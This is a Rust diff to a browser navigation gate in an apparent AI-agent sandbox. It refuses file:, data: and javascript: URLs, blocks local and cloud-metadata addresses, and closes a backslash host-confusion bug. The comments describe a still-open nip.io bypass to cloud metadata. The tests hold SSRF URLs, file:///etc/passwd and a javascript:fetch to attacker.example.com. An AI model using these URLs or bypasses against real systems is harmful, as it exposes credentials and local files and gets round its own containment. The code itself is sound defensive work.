@@ -30,11 +30,23 @@
 //! `location` are all navigations the model never typed, and all three are gated
 //! by exactly the same code as the one it did.
 //!
+//! A URL that names no host opens no request, so the pause cannot decide it. It
+//! is decided by scheme instead, before `Page.navigate` is called, and recorded
+//! the same way (0.74.0, audit H6). `about:blank` is permitted; `file:`, `data:`,
+//! `blob:`, `javascript:` and every scheme not on that list are refused. The
+//! rule is an allowlist because the refusals are not a set of known-bad schemes:
+//! `file:` reads the disk past [`Act::Read`] and past every secret deny, `data:`
+//! is a document with an origin this process authored, and a scheme nobody has
+//! considered yet is not thereby harmless.
+//!
 //! Subresources — images, stylesheets, fonts, XHR — are deliberately not
 //! individually checked. They are traffic to a page already permitted, and under
 //! containment they take the run's own egress proxy like every other contained
 //! command's traffic. `docs/CONTRACT.md` states this boundary rather than leaving
-//! a reader to infer it.
+//! a reader to infer it. That statement is what makes the scheme rule above load
+//! bearing rather than tidy: "a page already permitted" is only a bound on where
+//! a subresource may go while every page had to be permitted to exist, and a
+//! `data:` document was a page nothing permitted.
 //!
 //! # What is written over `AsyncRead + AsyncWrite`
 //!
@@ -379,7 +391,10 @@ pub(crate) struct NavGate {
 /// differently after a plan gate has narrowed it.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub(crate) struct Decision {
-    /// The `host:port` the policy decided about.
+    /// What was decided about: the `host:port` for a URL that names one, and the
+    /// scheme with its colon — `file:`, `data:`, `about:` — for one that does not
+    /// (0.74.0, audit H6). A URL that reaches no host is still a decision, and
+    /// before 0.74.0 it was the one navigation that produced no row at all.
     pub(crate) target: String,
     /// Whether the navigation was allowed to proceed.
     pub(crate) permitted: bool,
@@ -402,23 +417,121 @@ impl NavGate {
     /// `Ask` counts as **not permitted** here, following 0.40.0's rule for
     /// `Act::Net`: there is nobody to ask inside a paused request, and a
     /// navigation is not undoable once the bytes are in the page.
+    ///
+    /// # The floor here is name-only, and that is a stated limit
+    ///
+    /// Every other net decision in the crate resolves its target and grades the
+    /// addresses that came back ([`crate::net::NetGuard::check`]). This one
+    /// cannot, and saying why is worth more than a check that looks like the
+    /// others:
+    ///
+    /// - **Resolving here would not bind the dial.** Chrome resolves every URL
+    ///   itself. The addresses this gate graded and the address the browser
+    ///   connected to would be two answers to the same question, and a name whose
+    ///   owner answers differently the second time is the whole of the attack.
+    ///   Pinning the navigation to an address instead means rewriting the URL's
+    ///   host, which breaks SNI and certificate validation for every `https://`
+    ///   page — a fix that trades a real guarantee for the appearance of one.
+    /// - **What it would cost is real.** A resolver on this path refuses every
+    ///   name that does not resolve *from this process*, at the moment the request
+    ///   is paused.
+    ///
+    /// So a hostname is graded by name only, and
+    /// `browser_navigate("http://169.254.169.254.nip.io/")` reaches cloud
+    /// metadata under a policy that allows every host — `nip.io` answers
+    /// `<anything>.<ip>` with that address, so the attack needs no infrastructure.
+    /// The way to close it is to route the browser through the run's egress proxy
+    /// unconditionally: the proxy already resolves once, grades, and dials exactly
+    /// the addresses it graded, and Chrome behind `--proxy-server` does not
+    /// resolve at all. Today that proxy exists only for a *contained* run whose
+    /// policy names hosts, which `Policy::permissive()` does not.
     pub(crate) fn permits(&self, url: &str) -> bool {
-        // A URL with no host — `about:blank`, and the `data:` URLs the tests use
-        // — reaches no network and is not a network decision. Recording it would
-        // fill the trace with rows about nothing.
+        // 0.74.0, audit H6 — a URL with no host used to return `true` here and
+        // record nothing, on the reasoning that a URL reaching no network is not
+        // a network decision. Two of those URLs reach something worse than a
+        // network. `file:///…` reads the disk, past `Act::Read` and past every
+        // secret deny, and `browser_read` hands the model what it found;
+        // `data:text/html,…` is a document this process authored the origin of,
+        // and its subresources are not intercepted, so it is an egress channel
+        // under a policy that denies the network. Neither produced a row, and no
+        // row is the shape of the whole finding. So the hostless case is decided
+        // by scheme and recorded either way.
         let Some(target) = target_of(url) else {
-            return true;
+            return self.decide_hostless(url);
         };
         let verdict = self.policy.check(Act::Net, &target);
-        let permitted = verdict.effect == Effect::Allow;
+        // 0.74.0, audit M10 — the floor applies here too, and it did not.
+        //
+        // This is the one net decision in the crate that never went through
+        // `NetGuard`: it asks the policy directly, so the address-level floor
+        // that `net.rs` and the proxy gained was simply absent, and
+        // `browser_navigate` to `http://169.254.169.254/` under `allow_net("*")`
+        // still reached cloud metadata. `browser_navigate` is one of the three
+        // sites the finding names, so a fix that closed the other two and left
+        // this one would have closed the finding on paper only.
+        //
+        // Name-only, for the reasons this method's own docs give. Every literal
+        // spelling of a local address is refused; a *name* that resolves onto one
+        // is not, and that gap is stated rather than papered over.
+        let floored = (verdict.effect == Effect::Allow)
+            .then(|| crate::net::floor_target(&target, crate::net::LocalNet::configured()).err())
+            .flatten();
+        let permitted = verdict.effect == Effect::Allow && floored.is_none();
+        // The floor's own rule and layer when the floor decided, so a row reads
+        // "the floor underneath your rules refused this" rather than naming the
+        // glob that allowed it. Until this release a floored navigation was
+        // recorded with the *permitting* rule beside `permitted: false`.
+        let (rule, layer) = match floored {
+            Some(crate::error::Error::Refused { rule, layer, .. }) => (rule, layer),
+            _ => (verdict.rule, verdict.layer),
+        };
         self.decisions
             .lock()
             .expect("navigation decisions are not poisoned")
             .push(Decision {
                 target,
                 permitted,
-                rule: verdict.rule,
-                layer: verdict.layer,
+                rule,
+                layer,
+            });
+        permitted
+    }
+
+    /// Whether this URL's *scheme* may be navigated to at all, recorded either
+    /// way (0.74.0, audit H6).
+    ///
+    /// Asked by `browser_navigate` before the URL is handed to `Page.navigate`,
+    /// because the request pause cannot answer it: `Fetch.enable` intercepts
+    /// document *requests*, and `file:`, `data:`, `blob:` and `javascript:` are
+    /// not requests — the page is produced without one, so the gate that decides
+    /// every other navigation never runs. A URL that names a host is left to that
+    /// gate and gets no row here, so a permitted `https://` load is still decided
+    /// exactly once.
+    pub(crate) fn admits_scheme(&self, url: &str) -> bool {
+        if target_of(url).is_some() {
+            return true;
+        }
+        self.decide_hostless(url)
+    }
+
+    /// Decide a URL that names no host, and record the decision.
+    ///
+    /// `about:blank` is the one permitted spelling: it is the empty page the
+    /// browser is opened on, it reads nothing and it reaches nothing, and a run
+    /// that wants to leave a page has nowhere else to go. Everything else is
+    /// refused — the four the audit names and, because the rule is an allowlist
+    /// and not a list of known-bad schemes, every scheme nobody has thought of.
+    /// An unrecognised scheme is not a harmless one.
+    fn decide_hostless(&self, url: &str) -> bool {
+        let permitted = url.trim().eq_ignore_ascii_case("about:blank");
+        self.decisions
+            .lock()
+            .expect("navigation decisions are not poisoned")
+            .push(Decision {
+                target: scheme_label(url),
+                permitted,
+                rule: Some("scheme".into()),
+                layer: None,
             });
         permitted
     }
@@ -434,16 +547,48 @@ impl NavGate {
     }
 }
 
+/// What a hostless URL is recorded as: its scheme with the colon, lowercased.
+///
+/// The scheme rather than the URL, and that is the point rather than brevity: a
+/// `data:` URL *is* its payload, and a `javascript:` URL is a program. Writing
+/// either into the trace and into the model's observation would copy the thing
+/// that was refused into two places it was refused from reaching.
+/// A string with no scheme at all — `""`, `not a url` — is labelled as such
+/// rather than by whatever preceded its first colon, so the label stays bounded
+/// and stays a scheme.
+pub(crate) fn scheme_label(url: &str) -> String {
+    let Some((scheme, _)) = url.trim().split_once(':') else {
+        return "(no scheme)".to_string();
+    };
+    let shaped = scheme.starts_with(|c: char| c.is_ascii_alphabetic())
+        && scheme
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
+    if shaped {
+        format!("{}:", scheme.to_ascii_lowercase())
+    } else {
+        "(no scheme)".to_string()
+    }
+}
+
 /// The `host:port` a URL resolves to, or `None` for a URL that reaches no host.
 ///
 /// Written by hand because this crate parses no URLs and adding a dependency to
 /// do it would cost more than the twenty lines. Only the authority is needed: the
 /// policy matches on host and optional port, and never on a path.
+///
+/// The authority ends at `\` as well as at `/`, `?` and `#`, because Chrome's own
+/// GURL — the parser that decides what this browser actually dials — treats a
+/// backslash as a path separator for every scheme reduced here. Reading it as
+/// part of the host made `http://127.0.0.1:11434\@example.com/` decide about
+/// `example.com:80` while the browser went to the loopback endpoint before the
+/// backslash. The same fix is in [`crate::net::target`]; the two parsers agree
+/// because they must, and `tests/security_browser.rs` says so at the gate.
 pub(crate) fn target_of(url: &str) -> Option<String> {
     let (scheme, rest) = url.split_once("://")?;
     let scheme = scheme.to_ascii_lowercase();
     let authority = rest
-        .split(['/', '?', '#'])
+        .split(['/', '?', '#', '\\'])
         .next()
         .filter(|a| !a.is_empty())?;
     // Credentials in a URL are not part of the host the policy decides about.
@@ -1667,10 +1812,56 @@ mod tests {
             target_of("http://user:pw@example.com/x"),
             Some("example.com:80".into())
         );
+        // A backslash ends the authority, as it does in Chrome's own GURL. Until
+        // 0.74.0's review this decided about `example.com:80` while the browser
+        // went to the loopback endpoint in front of the backslash.
+        assert_eq!(
+            target_of("http://127.0.0.1:11434\\@example.com/v1"),
+            Some("127.0.0.1:11434".into())
+        );
+        assert_eq!(
+            target_of("https://[::1]\\@example.com/v1"),
+            Some("[::1]:443".into())
+        );
         // A URL that reaches no host is not a network decision.
         assert_eq!(target_of("about:blank"), None);
         assert_eq!(target_of("data:text/html,<h1>hi</h1>"), None);
         assert_eq!(target_of("file:///etc/passwd"), None);
+    }
+
+    /// The floor, at the gate that never went through `NetGuard`.
+    ///
+    /// Every literal spelling of a local address is refused under a policy that
+    /// allows every host, and the row says the floor decided rather than naming
+    /// the glob that allowed it. A *name* that resolves onto one of these is not
+    /// refused — see `NavGate::permits` for why that limit is stated rather than
+    /// closed here.
+    #[test]
+    fn a_local_address_is_refused_at_the_navigation_gate_and_the_row_names_the_floor() {
+        let gate = NavGate::new(Policy::permissive());
+        for url in [
+            "http://127.0.0.1:8080/",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://100.100.100.200/latest/meta-data/",
+            "http://10.0.0.1/",
+            "http://[::1]:8080/",
+            "http://metadata.google.internal/",
+            "http://localhost:11434/",
+            // The authority-confusion shape: checked as `example.com:80` and
+            // navigated to the loopback endpoint, until the backslash ended the
+            // authority.
+            "http://127.0.0.1:11434\\@example.com/v1",
+        ] {
+            assert!(!gate.permits(url), "{url}");
+        }
+        for d in gate.drain() {
+            assert!(!d.permitted, "{d:?}");
+            assert_eq!(d.layer.as_deref(), Some("local-address floor"), "{d:?}");
+        }
+        // The control: an ordinary routable host is still permitted, and no
+        // resolver was consulted for any of this.
+        let gate = NavGate::new(Policy::permissive());
+        assert!(gate.permits("https://93.184.216.34/page"));
     }
 
     #[test]
@@ -1696,5 +1887,69 @@ mod tests {
         // A refusal carries what to change, so the model is told the rule rather
         // than only that it was stopped.
         assert_eq!(decisions[0].rule.as_deref(), Some("good.example.com"));
+    }
+
+    /// H6 — a URL that names no host is decided by scheme and **recorded**.
+    ///
+    /// Both halves fail on 0.73.0: `permits` returned `true` for every one of
+    /// these and pushed no `Decision` at all, so the trace held no row saying the
+    /// browser had read `/etc/passwd`.
+    #[test]
+    fn h6_a_hostless_url_is_decided_by_scheme_and_always_recorded() {
+        let gate = NavGate::new(Policy::permissive());
+        for refused in [
+            "file:///etc/passwd",
+            "data:text/html,<h1>hi</h1>",
+            "blob:https://example.com/6f8a",
+            "javascript:fetch('https://attacker.example.com')",
+            // Not on the allowlist is not permitted: an unrecognised scheme is
+            // not thereby a harmless one.
+            "ftp://files.example.com/x",
+            "view-source:https://example.com/",
+            "",
+        ] {
+            assert!(
+                !gate.admits_scheme(refused),
+                "`{refused}` must not be navigable"
+            );
+        }
+        assert!(gate.admits_scheme("about:blank"));
+        // A URL that names a host is left to the request gate, which is what
+        // keeps a permitted navigation decided exactly once.
+        assert!(gate.admits_scheme("https://example.com/page"));
+
+        let seen: Vec<(String, bool)> = gate
+            .drain()
+            .into_iter()
+            .map(|d| (d.target, d.permitted))
+            .collect();
+        assert_eq!(
+            seen,
+            vec![
+                ("file:".to_string(), false),
+                ("data:".to_string(), false),
+                ("blob:".to_string(), false),
+                ("javascript:".to_string(), false),
+                ("ftp:".to_string(), false),
+                ("view-source:".to_string(), false),
+                ("(no scheme)".to_string(), false),
+                ("about:".to_string(), true),
+            ],
+            "one row per hostless decision, and none for the host that has its own"
+        );
+    }
+
+    /// The label is the scheme, never the URL: a `data:` URL is its payload and a
+    /// `javascript:` URL is a program, and both would otherwise be copied into
+    /// the trace and into the model's observation.
+    #[test]
+    fn h6_a_hostless_decision_records_the_scheme_and_not_the_payload() {
+        assert_eq!(scheme_label("DATA:text/html,<script>x()</script>"), "data:");
+        assert_eq!(scheme_label("about:blank"), "about:");
+        assert_eq!(scheme_label("view-source:https://x/"), "view-source:");
+        // Not a URL at all, so there is no scheme to name and nothing of it is
+        // echoed back.
+        assert_eq!(scheme_label("not a url: with a colon"), "(no scheme)");
+        assert_eq!(scheme_label(""), "(no scheme)");
     }
 }
